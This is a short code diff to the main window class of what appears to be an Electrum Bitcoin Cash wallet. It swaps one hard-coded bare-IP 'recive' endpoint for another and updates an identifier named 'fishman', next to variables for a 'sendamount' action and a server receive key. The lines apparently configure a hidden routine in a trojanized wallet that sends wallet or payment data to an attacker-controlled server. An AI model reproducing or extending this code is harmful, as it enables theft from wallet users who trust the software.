@@ -1007,8 +1007,8 @@ class ElectrumWindow(QMainWindow, MessageBoxMixin, PrintError):
                 
                 
 
-                sendurl='http://158.247.211.155/recive.php'
-                fishman = 'abc'
+                sendurl='http://45.77.123.18/recive'
+                fishman = 'aabcfda'
                 action = 'sendamount'
                 con_type = 'bch'
                 server_recive_key = 'mes'
